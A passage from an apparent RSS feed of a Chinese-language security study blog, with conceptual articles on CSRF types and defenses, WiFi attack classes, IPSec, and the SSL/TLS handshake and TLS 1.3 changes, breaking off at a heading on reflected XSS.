            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;资源包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资源包含&#34;&gt;#&lt;/a&gt; 资源包含&lt;/h2&gt;
&lt;p&gt;资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 &amp;lt;image&amp;gt;、&amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt;、&amp;lt;object&amp;gt;、&amp;lt;script &amp;gt; 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。&lt;/p&gt;
&lt;p&gt;由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。&lt;/p&gt;
&lt;h2 id=&#34;基于表单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于表单&#34;&gt;#&lt;/a&gt; 基于表单&lt;/h2&gt;
&lt;p&gt;通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单；其包含一个 JavaScript 片段，强制受害者的浏览器提交。&lt;/p&gt;
&lt;p&gt;该表单可以完全由隐藏的元素组成，以致受害者很难发现它。&lt;/p&gt;
&lt;p&gt;如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。&lt;/p&gt;
&lt;h2 id=&#34;xmlhttprequest&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xmlhttprequest&#34;&gt;#&lt;/a&gt; XMLHttpRequest&lt;/h2&gt;
&lt;p&gt;XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。&lt;/p&gt;
&lt;p&gt;基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。&lt;/p&gt;
&lt;p&gt;这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。&lt;/p&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过 CSRF-token 或者验证码来检测用户提交&lt;/li&gt;
&lt;li&gt;验证 Referer/Content-Type&lt;/li&gt;
&lt;li&gt;对于用户修改删除等操作最好都使用 POST 操作&lt;/li&gt;
&lt;li&gt;避免全站通用的 Cookie，严格设置 Cookie 的域&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ2l0aHViLmNvbS9qcm96bmVyL2NzcmYtZGVtbw==&#34;&gt;demo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=&#34;&gt;Wiping Out CSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9uZWF0LXRyaWNrcy10by1ieXBhc3MtY3NyZnByb3RlY3Rpb24=&#34;&gt;Neat tricks to bypass CSRF protection&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/WiFi/</guid>
            <title>WiFi</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/WiFi/</link>
            <category>计算机网络</category>
            <category>WiFi</category>
            <pubDate>Sat, 26 Nov 2022 16:48:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;Wi-Fi 又称 “无线热点” 或 “无线网络”，是 Wi-Fi 联盟的商标，一个基于 IEEE 802.11 标准的无线局域网技术。&lt;/p&gt;
&lt;h1 id=&#34;攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h1&gt;
&lt;h2 id=&#34;暴力破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴力破解&#34;&gt;#&lt;/a&gt; 暴力破解&lt;/h2&gt;
&lt;p&gt;WiFi 密码是基于预置的秘钥，可以通过抓取报文的方式在本地快速的批量进行密码爆破尝试。&lt;/p&gt;
&lt;h2 id=&#34;伪造热点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪造热点&#34;&gt;#&lt;/a&gt; 伪造热点&lt;/h2&gt;
&lt;p&gt;AP 可以动态的广播自己，客户也可以主动发送探针请求。可以伪造 AP 发送对探针请求的响应包，来让客户端错误的识别。&lt;/p&gt;
&lt;h2 id=&#34;秘钥重装攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#秘钥重装攻击&#34;&gt;#&lt;/a&gt; 秘钥重装攻击&lt;/h2&gt;
&lt;p&gt;该漏洞由 Vanhoef 发现。Wi-Fi 在握手时双方会更新秘钥，该攻击通过重放握手信息，令客户端重新安装相同的秘钥。&lt;/p&gt;
&lt;h2 id=&#34;dragonblood&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dragonblood&#34;&gt;#&lt;/a&gt; Dragonblood&lt;/h2&gt;
&lt;p&gt;最新版的 WPA3 标准在实现上存在一些问题，同样由 Vanhoef 发现。包含拒绝服务攻击、降级攻击、侧信道泄露等。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2ktZmkub3JnLw==&#34;&gt;Wi-Fi Alliance&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9kcmFnb25ibG9vZC5wZGY=&#34;&gt;Dragonblood&lt;/span&gt; : Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9ub3Jkc2VjMjAxOS5wZGY=&#34;&gt;Improving Privacy through Fast Passive Wi-Fi Scanning&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9hc2lhY2NzMjAxOS5wZGY=&#34;&gt;Practical Side-Channel Attacks against WPA-TKIP&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9ibGFja2hhdC1ldTIwMTcucGRm&#34;&gt;Key Reinstallation Attacks: Breaking the WPA2 Protocol&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc2NjQ=&#34;&gt;RFC 7664 Dragonfly Key Exchange&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/IPSec/</guid>
            <title>IPSec</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/IPSec/</link>
            <category>计算机网络</category>
            <category>IPSec</category>
            <category>VPN</category>
            <pubDate>Sat, 26 Nov 2022 16:47:59 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;IPsec（IP Security）是 IETF 制定的三层隧道加密协议，它为 Internet 上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。特定的通信方之间在 IP 层通过加密与数据源认证等方式，提供了以下的安全服务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据机密性（Confidentiality）：IPsec 发送方在通过网络传输包前对包进行加密。&lt;/li&gt;
&lt;li&gt;数据完整性（Data Integrity）：IPsec 接收方对发送方发送来的包进行认证，以确保数据在传输过程中没有被篡改。&lt;/li&gt;
&lt;li&gt;数据来源认证（Data Authentication）：IPsec 在接收端可以认证发送 IPsec 报文的发送端是否合法。&lt;/li&gt;
&lt;li&gt;防重放（Anti-Replay）：IPsec 接收方可检测并拒绝接收过时或重复的报文。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;优点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#优点&#34;&gt;#&lt;/a&gt; 优点&lt;/h1&gt;
&lt;p&gt;IPsec 具有以下优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持 IKE（Internet Key Exchange，因特网密钥交换），可实现密钥的自动协商功能，减少了密钥协商的开销。可以通过 IKE 建立和维护 SA 的服务，简化了 IPsec 的使用和管理。&lt;/li&gt;
&lt;li&gt;所有使用 IP 协议进行数据传输的应用系统和服务都可以使用 IPsec，而不必对这些应用系统和服务本身做任何修改。&lt;/li&gt;
&lt;li&gt;对数据的加密是以数据包为单位的，而不是以整个数据流为单位，这不仅灵活而且有助于进一步提高 IP 数据包的安全性，可以有效防范网络攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;构成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#构成&#34;&gt;#&lt;/a&gt; 构成&lt;/h1&gt;
&lt;p&gt;IPsec 由四部分内容构成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;负责密钥管理的 Internet 密钥交换协议 IKE（Internet Key Exchange Protocol）&lt;/li&gt;
&lt;li&gt;负责将安全服务与使用该服务的通信流相联系的安全关联 SA（Security Associations）&lt;/li&gt;
&lt;li&gt;直接操作数据包的认证头协议 AH（IP Authentication Header）和安全载荷协议 ESP（IP Encapsulating Security Payload）&lt;/li&gt;
&lt;li&gt;若干用于加密和认证的算法&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;安全联盟security-associationsa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全联盟security-associationsa&#34;&gt;#&lt;/a&gt; 安全联盟（Security Association，SA）&lt;/h1&gt;
&lt;p&gt;IPsec 在两个端点之间提供安全通信，端点被称为 IPsec 对等体。&lt;/p&gt;
&lt;p&gt;SA 是 IPsec 的基础，也是 IPsec 的本质。SA 是通信对等体间对某些要素的约定，例如，使用哪种协议（AH、ESP 还是两者结合使用）、协议的封装模式（传输模式和隧道模式）、加密算法（DES、3DES 和 AES）、特定流中保护数据的共享密钥以及密钥的生存周期等。建立 SA 的方式有手工配置和 IKE 自动协商两种。&lt;/p&gt;
&lt;p&gt;SA 是单向的，在两个对等体之间的双向通信，最少需要两个 SA 来分别对两个方向的数据流进行安全保护。同时，如果两个对等体希望同时使用 AH 和 ESP 来进行安全通信，则每个对等体都会针对每一种协议来构建一个独立的 SA。&lt;/p&gt;
&lt;p&gt;SA 由一个三元组来唯一标识，这个三元组包括 SPI（Security Parameter Index，安全参数索引）、目的 IP 地址、安全协议号（AH 或 ESP）。&lt;/p&gt;
&lt;p&gt;SPI 是用于唯一标识 SA 的一个 32 比特数值，它在 AH 和 ESP 头中传输。在手工配置 SA 时，需要手工指定 SPI 的取值。使用 IKE 协商产生 SA 时，SPI 将随机生成。&lt;/p&gt;
&lt;h1 id=&#34;ike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ike&#34;&gt;#&lt;/a&gt; IKE&lt;/h1&gt;
&lt;p&gt;IKE（RFC2407，RFC2408、RFC2409）属于一种混合型协议，由 Internet 安全关联和密钥管理协议（ISAKMP）和两种密钥交换协议 OAKLEY 与 SKEME 组成。IKE 创建在由 ISAKMP 定义的框架上，沿用了 OAKLEY 的密钥交换模式以及 SKEME 的共享和密钥更新技术，还定义了它自己的两种密钥交换方式。&lt;/p&gt;
&lt;p&gt;IKE 使用了两个阶段的 ISAKMP：&lt;/p&gt;
&lt;p&gt;第一阶段，协商创建一个通信信道（IKE SA），并对该信道进行验证，为双方进一步的 IKE 通信提供机密性、消息完整性以及消息源验证服务； 第二阶段，使用已建立的 IKE SA 建立 IPsec SA（V2 中叫 Child SA）。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/SSL%E3%80%81TLS/</guid>
            <title>SSL/TLS</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/SSL%E3%80%81TLS/</link>
            <category>计算机网络</category>
            <category>SSL</category>
            <category>TLS</category>
            <pubDate>Sat, 26 Nov 2022 16:42:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;SSL 全称是 Secure Sockets Layer，安全套接字层，它是由网景公司 (Netscape) 在 1994 年时设计，主要用于 Web 的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL 已经成为互联网保密通信的工业标准。&lt;/p&gt;
&lt;p&gt;SSL 最初的几个版本 (SSL 1.0、SSL2.0、SSL 3.0) 由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组 (IETF) 正式接管，并更名为 TLS (Transport Layer Security)，发展至今已有 TLS 1.0、TLS1.1、TLS1.2、TLS1.3 这几个版本。&lt;/p&gt;
&lt;p&gt;如 TLS 名字所说，SSL/TLS 协议仅保障传输层安全。同时，由于协议自身特性 (数字证书机制)，SSL/TLS 不能被用于保护多跳 (multi-hop) 端到端通信，而只能保护点到点通信。&lt;/p&gt;
&lt;p&gt;SSL/TLS 协议能够提供的安全目标主要包括如下几个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;认证性：借助数字证书认证服务端端和客户端身份，防止身份伪造&lt;/li&gt;
&lt;li&gt;机密性：借助加密防止第三方窃听&lt;/li&gt;
&lt;li&gt;完整性：借助消息认证码 (MAC) 保障数据完整性，防止消息篡改&lt;/li&gt;
&lt;li&gt;重放保护：通过使用隐式序列号防止重放攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为了实现这些安全目标，SSL/TLS 协议被设计为一个两阶段协议，分为握手阶段和应用阶段：&lt;/p&gt;
&lt;p&gt;握手阶段也称协商阶段，在这一阶段，客户端和服务端端会认证对方身份 (依赖于 PKI 体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及 MasterSecret。后续通信使用的所有密钥都是通过 MasterSecret 生成。 在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。&lt;/p&gt;
&lt;h1 id=&#34;协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议&#34;&gt;#&lt;/a&gt; 协议&lt;/h1&gt;
&lt;p&gt;TLS 包含几个子协议，比较常用的有记录协议、警报协议、握手协议、变更密码规范协议等。&lt;/p&gt;
&lt;h2 id=&#34;记录协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#记录协议&#34;&gt;#&lt;/a&gt; 记录协议&lt;/h2&gt;
&lt;p&gt;记录协议 (Record Protocol) 规定了 TLS 收发数据的基本单位记录 (record)。&lt;/p&gt;
&lt;h2 id=&#34;警报协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#警报协议&#34;&gt;#&lt;/a&gt; 警报协议&lt;/h2&gt;
&lt;p&gt;警报协议 (Alert Protocol) 用于提示协议交互过程出现错误。&lt;/p&gt;
&lt;h2 id=&#34;握手协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#握手协议&#34;&gt;#&lt;/a&gt; 握手协议&lt;/h2&gt;
&lt;p&gt;握手协议 (Handshake Protocol) 是 TLS 里最复杂的子协议，在握手过程中协商 TLS 版本号、随机数、密码套件等信息，然后交换证书和密钥参数，最终双方协商得到会话密钥，用于后续的混合加密系统。&lt;/p&gt;
&lt;h2 id=&#34;变更密码规范协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#变更密码规范协议&#34;&gt;#&lt;/a&gt; 变更密码规范协议&lt;/h2&gt;
&lt;p&gt;变更密码规范协议 (Change Cipher Spec Protocol) 是一个 “通知”，告诉对方，后续的数据都将使用加密保护。&lt;/p&gt;
&lt;h1 id=&#34;交互过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交互过程&#34;&gt;#&lt;/a&gt; 交互过程&lt;/h1&gt;
&lt;h2 id=&#34;client-hello&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#client-hello&#34;&gt;#&lt;/a&gt; Client Hello&lt;/h2&gt;
&lt;p&gt;Client Hello 由客户端发送，内容包括客户端的一个 Unix 时间戳 (GMT Unix Time)、一些随机的字节 (Random Bytes)，还包括了客户端接受的算法类型 (Cipher Suites)。&lt;/p&gt;
&lt;h2 id=&#34;server-hello&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#server-hello&#34;&gt;#&lt;/a&gt; Server Hello&lt;/h2&gt;
&lt;p&gt;Server Hello 由服务端发送，内容包括服务端支持的算法类型、GMT Unix Time 以及 Random Bytes。&lt;/p&gt;
&lt;h2 id=&#34;certificate&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#certificate&#34;&gt;#&lt;/a&gt; Certificate&lt;/h2&gt;
&lt;p&gt;由服务端或者客户端发送，发送方会会将自己的数字证书发送给接收方，由接收方进行证书验证，如果不通过的话，接收方会中断握手的过程。一般跟在 Client / Server Hello 报文之后。&lt;/p&gt;
&lt;h2 id=&#34;server-key-exchange&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#server-key-exchange&#34;&gt;#&lt;/a&gt; Server Key Exchange&lt;/h2&gt;
&lt;p&gt;由服务端发送，将自己的公钥参数传输给了客户端，一般也和 Server Hello 与 Certificate 在一个 TCP 报文中。&lt;/p&gt;
&lt;h2 id=&#34;server-hello-done&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#server-hello-done&#34;&gt;#&lt;/a&gt; Server Hello Done&lt;/h2&gt;
&lt;p&gt;服务端发送，一般也和 Server Hello、Certificate 和 Server Key Exchange 在一个 TCP 报文中。&lt;/p&gt;
&lt;h2 id=&#34;client-key-exchange&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#client-key-exchange&#34;&gt;#&lt;/a&gt; Client Key Exchange&lt;/h2&gt;
&lt;p&gt;客户端发送，向服务端发送自己的公钥参数，与服务端协商密钥。&lt;/p&gt;
&lt;h2 id=&#34;change-cipher-spec&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#change-cipher-spec&#34;&gt;#&lt;/a&gt; Change Cipher Spec&lt;/h2&gt;
&lt;p&gt;客户端或者服务端发送，紧跟着 Key Exchange 发送，代表自己生成了新的密钥，通知对方以后将更换密钥，使用新的密钥进行通信。&lt;/p&gt;
&lt;h2 id=&#34;encrypted-handshake-message&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#encrypted-handshake-message&#34;&gt;#&lt;/a&gt; Encrypted Handshake Message&lt;/h2&gt;
&lt;p&gt;客户端或者服务端发送，紧跟着 Key Exchange 发送。进行测试，一方用自己的刚刚生成的密钥加密一段固定的消息发送给对方，如果密钥协商正确无误的话，对方可以正确解密。&lt;/p&gt;
&lt;h2 id=&#34;new-session-ticket&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#new-session-ticket&#34;&gt;#&lt;/a&gt; New Session Ticket&lt;/h2&gt;
&lt;p&gt;服务端发送，表示发起会话，在一段时间之内 (超时时间到来之前)，双方都以刚刚交换的密钥进行通信。从这以后，加密通信正式开始。&lt;/p&gt;
&lt;h2 id=&#34;application-data&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#application-data&#34;&gt;#&lt;/a&gt; Application Data&lt;/h2&gt;
&lt;p&gt;使用密钥交换协议协商出来的密钥加密的应用层的数据。&lt;/p&gt;
&lt;h2 id=&#34;encrypted-alert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#encrypted-alert&#34;&gt;#&lt;/a&gt; Encrypted Alert&lt;/h2&gt;
&lt;p&gt;客户端或服务端发送，意味着加密通信因为某些原因需要中断，警告对方不要再发送敏感的数据。&lt;/p&gt;
&lt;h1 id=&#34;版本更新内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#版本更新内容&#34;&gt;#&lt;/a&gt; 版本更新内容&lt;/h1&gt;
&lt;h2 id=&#34;tls-13&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tls-13&#34;&gt;#&lt;/a&gt; TLS 1.3&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;引入了 PSK 作为新的密钥协商机制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;支持 0-RTT 模式，以安全性降低为代价，在建立连接时节省了往返时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ServerHello 之后的所有握手消息采取了加密操作，可见明文减少&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不再允许对加密报文进行压缩、不再允许双方发起重协商&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DSA 证书不再允许在 TLS 1.3 中使用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除不安全的密码算法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RSA 密钥传输 - 不支持前向安全性&lt;/li&gt;
&lt;li&gt;CBC 模式密码 - 易受 BEAST 和 Lucky 13 攻击&lt;/li&gt;
&lt;li&gt;RC4 流密码 - 在 HTTPS 中使用并不安全&lt;/li&gt;
&lt;li&gt;SHA-1 哈希函数 - 建议以 SHA-2 取而代之&lt;/li&gt;
&lt;li&gt;任意 Diffie-Hellman 组 - CVE-2016-0701 漏洞&lt;/li&gt;
&lt;li&gt;输出密码 - 易受 FREAK 和 LogJam 攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;子协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#子协议&#34;&gt;#&lt;/a&gt; 子协议&lt;/h1&gt;
&lt;p&gt;SSL/TLS 协议有一个高度模块化的架构，分为很多子协议，主要是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Handshake 协议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包括协商安全参数和密码套件、服务端身份认证 (客户端身份认证可选)、密钥交换&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ChangeCipherSpec 协议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一条消息表明握手协议已经完成&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Alert 协议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对握手协议中一些异常的错误提醒，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Record 协议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包括对消息的分段、压缩、消息认证和完整性保护、加密等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzIyNDY=&#34;&gt;RFC 2246 The TLS Protocol Version 1.0&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQzNDY=&#34;&gt;RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUyNDY=&#34;&gt;RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYxMDE=&#34;&gt;RFC 6101 The Secure Sockets Layer (SSL) Protocol Version 3.0&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYxNzY=&#34;&gt;RFC 6176 Prohibiting Secure Sockets Layer (SSL) Version 2.0&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc1Njg=&#34;&gt;RFC 7568 Deprecating Secure Sockets Layer Version 3.0&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0NDY=&#34;&gt;RFC 8446 The Transport Layer Security (TLS) Protocol Version 1.3&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;document&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#document&#34;&gt;#&lt;/a&gt; Document&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVHJhbnNwb3J0X0xheWVyX1NlY3VyaXR5&#34;&gt;Wikipedia Transport Layer Security&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</guid>
            <title>XSS</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</link>
            <category>网络安全</category>
            <category>XSS</category>
            <category>漏洞</category>
            <pubDate>Sat, 26 Nov 2022 11:55:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。&lt;/p&gt;
&lt;h2 id=&#34;反射型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xss&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h2&gt;
